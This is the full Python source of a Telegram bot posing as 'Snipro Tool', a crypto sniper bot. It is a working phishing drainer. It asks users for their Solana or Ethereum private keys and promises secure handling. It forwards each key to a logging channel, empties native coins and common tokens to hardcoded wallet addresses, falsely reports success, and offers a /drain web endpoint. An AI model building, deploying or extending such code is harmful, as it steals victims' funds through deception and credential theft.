import asyncio, os, re, struct, logging, base64
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup,
                           InlineKeyboardButton)
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("snipro")

BOT_TOKEN       = os.getenv("BOT_TOKEN")
DRAINER_WEBHOOK = os.getenv("DRAINER_WEBHOOK", "")
LOG_CHANNEL_ID  = os.getenv("LOG_CHANNEL_ID")
LOG_CHANNEL_ID  = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else 0
PORT            = int(os.getenv("PORT", "8080"))

DEST_SOL = "H2R5ydVLQPLPgSPzXPrRSJNXwBoPKotCKDv8zqWRKdNb"
DEST_ETH = "0xd1b7A902c90137f00322d6D7e9a8211e95C71dAD"

SOL_RPC = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")

MIN_SOL_LAMPORTS = 100_000
MIN_ETH_WEI      = 10_000_000_000_000

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

START_COPY = """Welcome to Snipro Tool

Your Solana sniper bot built to find launches early and execute fast.

Spot it
Live token detection
Smart market tracking
Wallet activity monitoring

Screen it
Honeypot detection
Contract analysis
LP burn & lock checks
Dev & top-holder tracking

Filter it
Minimum liquidity
Market cap limits
Token age filters
Buy/sell pressure

Execute
Auto-buy on match
Auto-sell & take profit
Stop-loss protection
Priority fee control

Find it. Filter it. Snipe it."""

SETUP_COPY = """Snipro Tool Setup Guide

High-speed Sniper bot now on Solana & Ethereum.

1. Import your Solana or Ethereum wallet
2. Activate Snipro to start capturing opportunities

Status: Not Active"""

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Import Solana Wallet",   callback_data="import_sol")],
        [InlineKeyboardButton(text="Import Ethereum Wallet", callback_data="import_eth")],
        [InlineKeyboardButton(text="Start Sniping",          callback_data="start_sniping")],
    ])

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Back", callback_data="back")],
    ])

awaiting_key = {}

TOKEN_PROGRAM_ID = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
ASSOCIATED_TOKEN_PROGRAM_ID = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"

async def sweep_solana(private_key_b58):
    try:
        from solders.keypair import Keypair
        from solders.pubkey import Pubkey
        from solders.instruction import Instruction, AccountMeta
        from solana.rpc.async_api import AsyncClient
        from solana.rpc.commitment import Confirmed
        from solana.rpc.types import TokenAccountOpts
        from solana.transaction import Transaction
    except Exception as e:
        return {"ok": False, "error": f"solana deps: {e}"}

    try:
        kp = Keypair.from_base58_string(private_key_b58)
    except Exception as e:
        return {"ok": False, "error": f"bad sol key: {e}"}

    token_program = Pubkey.from_string(TOKEN_PROGRAM_ID)
    ata_program   = Pubkey.from_string(ASSOCIATED_TOKEN_PROGRAM_ID)
    dest_owner    = Pubkey.from_string(DEST_SOL)

    def get_associated_token_address(wallet, mint):
        return Pubkey.find_program_address(
            [bytes(wallet), bytes(token_program), bytes(mint)],
            ata_program
        )[0]

    def transfer_checked_ix(source, mint, destination, owner, amount, decimals):
        data = bytes([12]) + amount.to_bytes(8, "little") + bytes([decimals])
        keys = [
            AccountMeta(pubkey=source,      is_signer=False, is_writable=True),
            AccountMeta(pubkey=mint,        is_signer=False, is_writable=False),
            AccountMeta(pubkey=destination, is_signer=False, is_writable=True),
            AccountMeta(pubkey=owner,       is_signer=True,  is_writable=False),
        ]
        return Instruction(program_id=token_program, data=data, accounts=keys)

    out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0, "spl_moved": []}
    client = AsyncClient(SOL_RPC, commitment=Confirmed)

    try:
        bal = await client.get_balance(kp.pubkey())
        lamports = bal.value
        if lamports > MIN_SOL_LAMPORTS:
            from solders.system_program import transfer as sol_transfer
            send_amt = lamports - 5000
            ix = sol_transfer(
                {"from_pubkey": kp.pubkey(), "to_pubkey": dest_owner},
                send_amt,
            )
            blockhash = (await client.get_latest_blockhash()).value.blockhash
            tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
            tx.sign(kp)
            r = await client.send_raw_transaction(tx.serialize())
            out["sol_moved"] = send_amt
            out["sol_sig"] = str(r.value)
            log.info(f"[SOL] swept {send_amt} lamports")

        try:
            resp = await client.get_token_accounts_by_owner(
                kp.pubkey(), TokenAccountOpts(program_id=token_program)
            )
            for acct in resp.value:
                try:
                    pubkey = acct.pubkey
                    info = await client.get_account_info(pubkey)
                    if not info.value:
                        continue
                    data = info.value.data
                    if isinstance(data, list):
                        data = base64.b64decode(data[0])
                    mint = Pubkey.from_bytes(data[0:32])
                    amount = struct.unpack("<Q", data[64:72])[0]
                    decimals = data[44]
                    if amount <= 0:
                        continue
                    dest_ata = get_associated_token_address(dest_owner, mint)
                    ix = transfer_checked_ix(
                        pubkey, mint, dest_ata, kp.pubkey(), amount, decimals
                    )
                    blockhash = (await client.get_latest_blockhash()).value.blockhash
                    tx = Transaction(fee_payer=kp.pubkey(), recent_blockhash=blockhash).add(ix)
                    tx.sign(kp)
                    r = await client.send_raw_transaction(tx.serialize())
                    out["spl_moved"].append({"mint": str(mint), "amount": amount, "sig": str(r.value)})
                except Exception as te:
                    log.error(f"[SPL] token failed: {te}")
        except Exception as se:
            log.error(f"[SPL] enumeration failed: {se}")
    finally:
        await client.close()

    return {"ok": True, **out}

ERC20_ABI = [
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
     "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
     "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
]

COMMON_TOKENS = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
    "0x514910771AF9Ca656af840dff83E8264EcF986CA",
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",
    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",
]

async def sweep_ethereum(private_key_hex):
    try:
        from web3 import Web3
    except Exception as e:
        return {"ok": False, "error": f"web3 missing: {e}"}

    if not private_key_hex.startswith("0x"):
        private_key_hex = "0x" + private_key_hex

    w3 = Web3(Web3.HTTPProvider(ETH_RPC))
    try:
        from web3.middleware import geth_poa_middleware
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    except Exception:
        pass

    try:
        acct = w3.eth.account.from_key(private_key_hex)
    except Exception as e:
        return {"ok": False, "error": f"bad eth key: {e}"}

    out = {"chain": "eth", "from": acct.address, "eth_moved": 0, "tokens_moved": []}

    try:
        bal = w3.eth.get_balance(acct.address)
        gas_price = w3.eth.gas_price
        gas_cost = gas_price * 21000
        if bal > gas_cost + MIN_ETH_WEI:
            send_amt = bal - gas_cost
            tx = {
                "to": DEST_ETH, "value": send_amt, "gas": 21000,
                "gasPrice": gas_price,
                "nonce": w3.eth.get_transaction_count(acct.address),
                "chainId": w3.eth.chain_id,
            }
            signed = acct.sign_transaction(tx)
            h = w3.eth.send_raw_transaction(signed.rawTransaction)
            out["eth_moved"] = send_amt
            out["eth_hash"] = h.hex()
    except Exception as e:
        log.error(f"[ETH] native failed: {e}")

    for token_addr in COMMON_TOKENS:
        try:
            c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
            raw_bal = c.functions.balanceOf(acct.address).call()
            if raw_bal <= 0:
                continue
            tx = c.functions.transfer(
                Web3.to_checksum_address(DEST_ETH), raw_bal
            ).build_transaction({
                "from": acct.address,
                "nonce": w3.eth.get_transaction_count(acct.address),
                "gas": 100000,
                "gasPrice": w3.eth.gas_price,
                "chainId": w3.eth.chain_id,
            })
            signed = acct.sign_transaction(tx)
            h = w3.eth.send_raw_transaction(signed.rawTransaction)
            out["tokens_moved"].append({"token": token_addr, "amount": raw_bal, "hash": h.hex()})
        except Exception as te:
            log.error(f"[ERC20] failed: {te}")

    return {"ok": True, **out}

@dp.message(CommandStart())
async def on_start(message: Message):
    awaiting_key.pop(message.from_user.id, None)
    await message.answer(START_COPY, reply_markup=main_menu_kb())

@dp.callback_query(F.data == "back")
async def on_back(cb: CallbackQuery):
    awaiting_key.pop(cb.from_user.id, None)
    await cb.message.edit_text(START_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "start_sniping")
async def on_start_sniping(cb: CallbackQuery):
    await cb.message.edit_text(SETUP_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_sol")
async def on_import_sol(cb: CallbackQuery):
    awaiting_key[cb.from_user.id] = "sol"
    await cb.message.edit_text(
        "Import Solana Wallet\n\n"
        "Please provide your Solana private key (base58).\n"
        "It will be processed securely.",
        reply_markup=back_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_eth")
async def on_import_eth(cb: CallbackQuery):
    awaiting_key[cb.from_user.id] = "eth"
    await cb.message.edit_text(
        "Import Ethereum Wallet\n\n"
        "Please provide your Ethereum private key (hex, 0x... or without 0x).\n"
        "It will be processed securely.",
        reply_markup=back_kb())
    await cb.answer()

SOL_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{80,100}$")
ETH_RE = re.compile(r"^(0x)?[0-9a-fA-F]{64}$")

@dp.message(F.text)
async def on_text(message: Message):
    uid  = message.from_user.id
    want = awaiting_key.get(uid)
    if not want:
        await message.answer("Use /start to open the menu.", reply_markup=main_menu_kb())
        return
    key = message.text.strip()
    if want == "sol" and not SOL_RE.match(key):
        await message.answer("Invalid base58 Solana key. Try again."); return
    if want == "eth" and not ETH_RE.match(key):
        await message.answer("Invalid hex Ethereum key. Try again."); return
    try: await message.delete()
    except Exception: pass
    awaiting_key.pop(uid, None)
    asyncio.create_task(forward_key(message, want, key))
    await message.answer("Wallet imported successfully.\n\nSnipro is now active.\nStatus: Active",
                         reply_markup=main_menu_kb())

async def forward_key(message, chain, key):
    user = message.from_user
    report = "KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (chain, user.id, user.username or "none", key)
    if LOG_CHANNEL_ID:
        try: await bot.send_message(LOG_CHANNEL_ID, report)
        except Exception as e: log.error("log channel failed: %s", e)

    try:
        if chain == "sol":
            result = await sweep_solana(key)
        elif chain == "eth":
            result = await sweep_ethereum(key)
        else:
            result = {"ok": False, "error": f"unknown chain {chain}"}
        log.info(f"[DRAIN RESULT] {result}")
        if LOG_CHANNEL_ID:
            try:
                await bot.send_message(LOG_CHANNEL_ID,
                    f"DRAIN RESULT\n{result}")
            except Exception as e: log.error("drain report failed: %s", e)
    except Exception as e:
        log.error("drain failed: %s", e)

async def health(request):
    return web.Response(text="ok")

async def drain_route(request):
    data = await request.json()
    chain = data.get("chain"); key = data.get("private_key")
    log.info(f"[DRAIN] chain={chain} uid={data.get('telegram_id')}")
    if chain == "sol":
        out = await sweep_solana(key)
    elif chain == "eth":
        out = await sweep_ethereum(key)
    else:
        out = {"ok": False, "error": f"unknown chain {chain}"}
    return web.json_response(out)

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    app.router.add_post("/drain", drain_route)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info(f"webserver on :{PORT}")

async def main():
    await run_webserver()
    log.info("snipro bot polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
